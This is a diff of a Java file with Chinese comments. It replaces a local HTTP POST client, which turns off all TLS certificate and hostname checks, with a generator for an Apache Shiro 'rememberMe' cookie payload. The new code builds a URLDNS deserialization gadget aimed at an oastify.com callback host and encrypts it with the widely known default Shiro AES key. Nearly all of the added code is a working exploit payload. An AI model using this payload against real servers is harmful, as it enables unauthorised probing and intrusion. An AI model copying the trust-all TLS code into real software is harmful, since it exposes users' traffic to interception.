@@ -1,69 +1,58 @@
-import java.io.DataOutputStream;
-import java.net.HttpURLConnection;
+
+import javax.crypto.Cipher;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
 import java.net.URL;
-import java.nio.charset.StandardCharsets;
-import javax.net.ssl.HttpsURLConnection;
-import javax.net.ssl.SSLContext;
-import javax.net.ssl.TrustManager;
-import javax.net.ssl.X509TrustManager;
-import java.security.cert.X509Certificate;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Random;
 
 public class Main {
-    public static void main(String[] args) {
-        // 第一步：忽略HTTPS自签证书（本地测试用，生产环境请勿使用）
-        disableSSLVerification();
+    private static final String DEFAULT_KEY_B64 = "kPH+bIxk5D2deZiIxcaaaA==";
 
-        HttpURLConnection conn = null;
-        try {
-            URL url = new URL("http://127.0.0.1:5000/11");
-            conn = (HttpURLConnection) url.openConnection();
-
-            // 1. 配置连接参数
-            conn.setRequestMethod("POST"); // POST请求必须设置
-            conn.setDoOutput(true); // 允许写入请求体（POST必备）
-            conn.setConnectTimeout(5000);
-            conn.setReadTimeout(5000);
-            // 可选：设置Content-Type（根据服务端要求，比如JSON/表单）
-            conn.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
-
-            // 2. 发送POST请求体（关键：必须写入请求体，否则POST请求不完整）
-            // 若服务端允许空请求体，可写空字符串，但仍需执行写入操作触发请求
-            String requestBody = ""; // 按需修改为实际请求体（如JSON字符串）
-            try (DataOutputStream dos = new DataOutputStream(conn.getOutputStream())) {
-                dos.write(requestBody.getBytes(StandardCharsets.UTF_8));
-                dos.flush();
-            }
-
-            // 3. 核心：获取响应状态码（必须在发送请求体后调用）
-            int responseCode = conn.getResponseCode();
-            System.out.println("HTTP响应状态码：" + responseCode);
-
-        } catch (Exception e) {
-            e.printStackTrace();
-        } finally {
-            // 4. 关闭连接，释放资源
-            if (conn != null) {
-                conn.disconnect();
-            }
-        }
+    public static void main(String[] args) throws Exception {
+        String dnsUrl = "http://ccc.jaysenscan.rsnhdeclvkmtdwvqdzetcizep5vwjt7i.oastify.com";
+        String payload = genURLDNS(dnsUrl);
+        System.out.println("rememberMe=" + payload);
     }
 
-    // 辅助方法：忽略HTTPS证书校验（本地测试专用）
-    private static void disableSSLVerification() {
-        try {
-            TrustManager[] trustAllCerts = new TrustManager[]{
-                    new X509TrustManager() {
-                        public X509Certificate[] getAcceptedIssuers() { return null; }
-                        public void checkClientTrusted(X509Certificate[] certs, String authType) {}
-                        public void checkServerTrusted(X509Certificate[] certs, String authType) {}
-                    }
-            };
-            SSLContext sc = SSLContext.getInstance("TLS");
-            sc.init(null, trustAllCerts, new java.security.SecureRandom());
-            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
-            HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+    /**
+     * 生成 URLDNS 反序列化链的字节数组
+     */
+    private static String genURLDNS(String urlStr) throws Exception {
+        // 实例化 URL 对象，此时 hashCode = -1
+        URL url = new URL(urlStr);
+        // 通过反射将 hashCode 设为非 -1，避免 put 时触发真正的 DNS 查询
+        Field hashCodeField = URL.class.getDeclaredField("hashCode");
+        hashCodeField.setAccessible(true);
+        hashCodeField.set(url, 0); // 任意非 -1 值
+        // 放入 HashMap
+        HashMap<URL, String> map = new HashMap<>();
+        map.put(url, "foo");
+        // 恢复 hashCode 为 -1，保证反序列化后重新计算 hashCode 触发 DNS 查询
+        hashCodeField.set(url, -1);
+        // 序列化 HashMap
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(map);
+        oos.close();
+
+        // Aes加密
+        byte[] key = Base64.getDecoder().decode(DEFAULT_KEY_B64);
+        byte[] iv = new byte[16];
+        new Random().nextBytes(iv);                     // 随机 IV
+        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
+        IvParameterSpec ivSpec = new IvParameterSpec(iv);
+        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
+        byte[] encrypted = cipher.doFinal(baos.toByteArray());
+        // 拼接 IV + 密文，再 Base64 编码
+        byte[] combined = new byte[iv.length + encrypted.length];
+        System.arraycopy(iv, 0, combined, 0, iv.length);
+        System.arraycopy(encrypted, 0, combined, iv.length, encrypted.length);
+        return Base64.getEncoder().encodeToString(combined);
     }
 }
